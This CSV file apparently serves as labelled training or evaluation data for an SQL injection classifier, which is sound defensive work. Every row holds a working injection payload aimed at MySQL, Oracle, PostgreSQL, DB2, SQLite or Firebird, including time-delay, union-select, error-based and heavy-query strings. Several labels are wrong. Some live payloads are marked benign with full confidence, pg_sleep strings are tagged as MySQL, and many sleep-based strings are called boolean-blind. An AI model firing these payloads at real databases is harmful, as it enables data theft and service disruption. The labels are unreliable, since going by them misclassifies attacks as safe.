id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1433,1' ) ) or sleep ( 5 ) and ( ( 'taaj' = 'taaj,time_blind,mysql,0.95,Time-based blind signal 'sleep (' detected; induces measurable delay for data inference.,2
1434,"1"" ) where 7919 = 7919 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '7919 = 7919'; structured to return different results based on condition.,2
1435,1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.95,Time-based blind signal 'sleep (' detected; induces measurable delay for data inference.,2
1436,"1%' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and '%' = '",boolean_blind,generic,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1437,"1', ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",boolean_blind,oracle,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,2
1438,"1' where 7125 = 7125 or elt ( 6272 = 6272,sleep ( 5 ) ) --",boolean_blind,mysql,0.95,Boolean logic confirmed by '7125 = 7125'; structured to return different results based on condition.,3
1439,"1' ) as noqp where 4042 = 4042 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,Boolean logic confirmed by '4042 = 4042'; structured to return different results based on condition.,3
1440,-9217 or 9323 = 9323#,boolean_blind,generic,0.95,Boolean logic confirmed by '9323 = 9323'; structured to return different results based on condition.,3
1441,1 ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 9932 = 9932,boolean_blind,postgresql,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1442,"1' union all select null,null,null,null,null--",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1443,"1%"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""%"" = """,boolean_blind,mysql,0.95,Boolean logic confirmed by 'rlike'; structured to return different results based on condition.,3
1444,1' ) as fxid where 5926 = 5926,boolean_blind,generic,0.95,Boolean logic confirmed by '5926 = 5926'; structured to return different results based on condition.,2
1445,1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and '%' = ',boolean_blind,mysql,0.95,Boolean logic confirmed by 'rlike'; structured to return different results based on condition.,3
1446,1'|| ( select 'ezse' from dual where 3821 = 3821,boolean_blind,oracle,0.95,Boolean logic confirmed by '3821 = 3821'; structured to return different results based on condition.,3
1447,"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'snad' like 'snad",boolean_blind,generic,0.95,Boolean logic confirmed by '6510 = ('; structured to return different results based on condition.,3
1448,( select ( case when ( 3592 = 3592 ) then 3592 else 3592* ( select 3592 from information_schema.character_sets ) end ) ),boolean_blind,mysql,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1449,1' ) ) ) order by 1--,benign,generic,1.0,No SQL injection signals or malicious patterns identified; payload appears benign.,3
1450,"-3719"" union all select 6609,6609,6609,6609#",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1451,"1"" ) ) as cduw where 4495 = 4495",boolean_blind,generic,0.95,Boolean logic confirmed by '4495 = 4495'; structured to return different results based on condition.,2
1452,1' ) ) as gchn where 5856 = 5856,boolean_blind,generic,0.95,Boolean logic confirmed by '5856 = 5856'; structured to return different results based on condition.,2
1453,-2781 ) ) ) or 2573 = 5848--,boolean_blind,generic,0.95,Boolean logic confirmed by '2573 = 5848'; structured to return different results based on condition.,3
1454,"1%"" ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""%"" = """,boolean_blind,generic,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1455,"-5548' where 4477 = 4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--",boolean_blind,generic,0.95,Boolean logic confirmed by '4477 = 4477'; structured to return different results based on condition.,1
1456,select pg_sleep ( 5 ) ) ||',time_blind,mysql,0.95,Time-based blind signal 'pg_sleep' detected; induces measurable delay for data inference.,2
1457,1 ) ) and 3228 = 7376#,boolean_blind,generic,0.95,Boolean logic confirmed by '3228 = 7376'; structured to return different results based on condition.,3
1458,"1 ) where 9645 = 9645 union all select null,null,null--",boolean_blind,generic,0.95,Boolean logic confirmed by '9645 = 9645'; structured to return different results based on condition.,1
1459,1 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.95,Time-based blind signal 'sleep (' detected; induces measurable delay for data inference.,2
1460,"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'tfnb' = 'tfnb",boolean_blind,postgresql,0.95,Boolean logic confirmed by '8421 = ('; structured to return different results based on condition.,1
1461,"select * from generate_series ( 5846,5846,case when ( 5846 = 5227 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1462,1' ) rlike sleep ( 5 ) and ( 'boto' = 'boto,boolean_blind,mysql,0.95,Boolean logic confirmed by 'rlike'; structured to return different results based on condition.,2
1463,"-6656"" ) union all select 3931#",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1464,"1"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""uosc"" = ""uosc",boolean_blind,oracle,0.95,Boolean logic confirmed by '5286 = ('; structured to return different results based on condition.,3
1465,1 ) ) as zoso where 3633 = 3633,boolean_blind,generic,0.95,Boolean logic confirmed by '3633 = 3633'; structured to return different results based on condition.,2
1466,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,generic,1.0,No SQL injection signals or malicious patterns identified; payload appears benign.,1
1467,1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 7015 = 7015,boolean_blind,mysql,0.95,Boolean logic confirmed by '6793 = ('; structured to return different results based on condition.,2
1468,"1'|| ( select 'xuof' from dual where 8794 = 8794 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,oracle,0.95,Boolean logic confirmed by '8794 = 8794'; structured to return different results based on condition.,1
1469,1' ) ) as cpwx where 5378 = 5378 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.95,Boolean logic confirmed by '5378 = 5378'; structured to return different results based on condition.,3
1470,"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'ywxe' like 'ywxe",error_based,mysql,0.95,Error-based exfiltration signal 'extractvalue' used to leak data via DB error messages.,2
1471,1 ) where 7956 = 7956 or sleep ( 5 ) #,boolean_blind,mysql,0.95,Boolean logic confirmed by '7956 = 7956'; structured to return different results based on condition.,2
1472,"-9774' ) ) ) union all select 6954,6954,6954#",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1473,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'ayjb' like 'ayjb",boolean_blind,mysql,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1474,"1 ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 8189 = 8189",boolean_blind,mysql,0.95,Boolean logic confirmed by '8189 = 8189'; structured to return different results based on condition.,1
1475,"1%' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,1.0,No SQL injection signals or malicious patterns identified; payload appears benign.,1
1476,"1 ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 9333 = 9333",boolean_blind,firebird,0.95,Boolean logic confirmed by '7552 = ('; structured to return different results based on condition.,3
1477,"1%' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,1.0,No SQL injection signals or malicious patterns identified; payload appears benign.,1
1478,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'mnod' = 'mnod",time_blind,sqlite,0.95,Time-based blind signal 'randomblob' detected; induces measurable delay for data inference.,2
1479,"-7700%' ) union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1480,"1 ) as pcnd where 4589 = 4589 union all select null,null,null,null,null,null,null,null,null,null--",boolean_blind,generic,0.95,Boolean logic confirmed by '4589 = 4589'; structured to return different results based on condition.,1
1481,1'+ ( select yjyp where 9696 = 9696,boolean_blind,generic,0.95,Boolean logic confirmed by '9696 = 9696'; structured to return different results based on condition.,3
1482,1 where 8214 = 8214 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,boolean_blind,postgresql,0.95,Boolean logic confirmed by '8214 = 8214'; structured to return different results based on condition.,3
1483,"-9574%' ) ) union all select 5645,5645,5645,5645,5645,5645,5645--",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1484,"1 ) as khkv where 2944 = 2944 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.95,Boolean logic confirmed by '2944 = 2944'; structured to return different results based on condition.,2
1485,"-3933%"" ) ) or elt ( 8142 = 2978,2978 ) and ( ( ""%"" = """,boolean_blind,generic,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1486,select ( case when ( 5322 = 6200 ) then 5322 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1487,"1%' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( '%' = '",boolean_blind,oracle,0.95,Boolean logic confirmed by '5556 = ('; structured to return different results based on condition.,3
1488,"-4031"" ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""auhn"" = ""auhn",boolean_blind,generic,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1489,"1 where 6100 = 6100 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '6100 = 6100'; structured to return different results based on condition.,3
1490,1' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),boolean_blind,mysql,0.95,Boolean logic confirmed by 'rlike'; structured to return different results based on condition.,3
1491,1'|| ( select 'jmhb' where 1794 = 1794 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,boolean_blind,mysql,0.95,Boolean logic confirmed by '1794 = 1794'; structured to return different results based on condition.,2
1492,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""mkal"" like ""mkal",benign,generic,1.0,No SQL injection signals or malicious patterns identified; payload appears benign.,1
1493,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""nxvp"" = ""nxvp",time_blind,sqlite,0.95,Time-based blind signal 'randomblob' detected; induces measurable delay for data inference.,2
1494,"1 where 7240 = 7240 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",boolean_blind,sqlite,0.95,Boolean logic confirmed by '7240 = 7240'; structured to return different results based on condition.,1
1495,1 where 8102 = 8102 and 9198 = 9198--,boolean_blind,generic,0.95,Boolean logic confirmed by '8102 = 8102'; structured to return different results based on condition.,3
1496,"1"" ) ) ) and ( 7758 = 4628 ) *4628 and ( ( ( ""wzas"" = ""wzas",boolean_blind,generic,0.95,Boolean logic confirmed by '7758 = 4628'; structured to return different results based on condition.,2
1497,"1' ) where 1646 = 1646 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '1646 = 1646'; structured to return different results based on condition.,3
1498,"1'|| ( select 'pzoe' where 2977 = 2977 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,Boolean logic confirmed by '2977 = 2977'; structured to return different results based on condition.,3
1499,"1%"" ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '5356 = ('; structured to return different results based on condition.,3
1500,"1' ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '2716 = ('; structured to return different results based on condition.,3
1501,"1 ) ) as hqwy where 4433 = 4433 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '4433 = 4433'; structured to return different results based on condition.,2
1502,"1"" ) where 1699 = 1699 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '1699 = 1699'; structured to return different results based on condition.,3
1503,1 ) as dlkh where 6179 = 6179 and 9198 = 9198--,boolean_blind,generic,0.95,Boolean logic confirmed by '6179 = 6179'; structured to return different results based on condition.,3
1504,"1 ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.95,Time-based blind signal 'dbms_pipe.receive_message' detected; induces measurable delay for data inference.,3
1505,"1%' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( '%' = '",benign,generic,1.0,No SQL injection signals or malicious patterns identified; payload appears benign.,1
1506,"1' where 7464 = 7464 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",boolean_blind,mysql,0.95,Boolean logic confirmed by '7464 = 7464'; structured to return different results based on condition.,1
1507,"1 ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.95,Boolean logic confirmed by '9660 = ('; structured to return different results based on condition.,3
1508,-6488' or 5164 = 9234,boolean_blind,generic,0.95,Boolean logic confirmed by '5164 = 9234'; structured to return different results based on condition.,3
1509,"1"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""deeu"" like ""deeu",boolean_blind,generic,0.95,Boolean logic confirmed by 'elt ('; structured to return different results based on condition.,2
1510,"1 ) ) as fmpr where 3103 = 3103 and elt ( 9970 = 9297,9297 ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '3103 = 3103'; structured to return different results based on condition.,3
1511,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""khuw"" like ""khuw",heavy_query,oracle,0.95,Heavy query signature 'all_users' used to cause resource-intensive processing (DoS/Time-delay).,1
1512,"1 ) as yduh where 6481 = 6481 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.95,Boolean logic confirmed by '6481 = 6481'; structured to return different results based on condition.,3
1513,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""ksip"" like ""ksip",time_blind,sqlite,0.95,Time-based blind signal 'randomblob' detected; induces measurable delay for data inference.,2
1514,"1"" ) as mszg where 6184 = 6184 rlike sleep ( 5 ) --",boolean_blind,mysql,0.95,Boolean logic confirmed by '6184 = 6184'; structured to return different results based on condition.,2
1515,"1%"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""%"" = """,boolean_blind,generic,0.95,Boolean logic confirmed by '8514 = ('; structured to return different results based on condition.,3
1516,"1'|| ( select 'ryyc' from dual where 5196 = 5196 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",boolean_blind,oracle,0.95,Boolean logic confirmed by '5196 = 5196'; structured to return different results based on condition.,2
1517,"-2284%"" ) ) or 9323 = 9323#",boolean_blind,generic,0.95,Boolean logic confirmed by '9323 = 9323'; structured to return different results based on condition.,3
1518,"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1519,"1"" rlike sleep ( 5 )",boolean_blind,mysql,0.95,Boolean logic confirmed by 'rlike'; structured to return different results based on condition.,2
1520,"1%"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""%"" = """,boolean_blind,postgresql,0.95,Boolean logic confirmed by '8421 = ('; structured to return different results based on condition.,1
1521,-4308' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'jmot' = 'jmot,boolean_blind,generic,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1522,1' ) as scnn where 9274 = 9274,boolean_blind,generic,0.95,Boolean logic confirmed by '9274 = 9274'; structured to return different results based on condition.,2
1523,"-9313%"" ) or 5971 = 4572#",boolean_blind,generic,0.95,Boolean logic confirmed by '5971 = 4572'; structured to return different results based on condition.,3
